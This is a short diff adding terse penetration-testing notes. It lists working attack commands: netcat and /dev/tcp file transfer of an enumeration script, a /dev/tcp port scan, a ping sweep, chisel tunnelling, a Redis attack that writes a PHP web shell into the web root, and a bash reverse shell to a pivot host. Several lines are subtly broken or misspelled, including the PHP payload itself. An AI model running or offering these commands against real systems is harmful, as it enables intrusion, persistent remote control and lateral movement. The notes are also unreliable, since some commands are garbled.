@@ -1,0 +1,44 @@
+transfer data;
+A: nc -lvnp 80 < LinEnum.sh
+B: bash -c " cat < /dev/tcp/ip/80 > /dev/shm/LinEnum.sh"
+
+
+test the tcp port:
+for i in 80 22 25 443 8443 8080;
+do
+	(echo "a" > /dev/tcp/ip/$i && echo "open $i") 2>/dev/null
+done
+
+test the machine alive:
+for i in {1..5}:
+do
+ (ping -c 1 172.17.0.$i && echo alive) 2>/dev/null
+done
+
+proxy tunnel :
+	chisel.git
+	go build -ldflags = '-s -w'  #make the package light wight
+	upx brute chisel
+
+connect to redis:
+echo " Hey no AUTH required!"
+
+flushall
+set phpcode "<? system(_REQUEST['cmd']); ?>"
+config set dbfilename ippsec.php
+config set dir /var/www/html
+save 
+
+reverve shell to chisel:
+kali: chisel server -p 8000
+victim1:  chisel clien 8000  9001:127.0.0.1:8005
+nc -lvnp 8005
+
+victim2:
+bash -c  "bash -i > /dev/tcp/victim1/9001 0>&1"
+
+gtfobins rsync
+
+
+
+
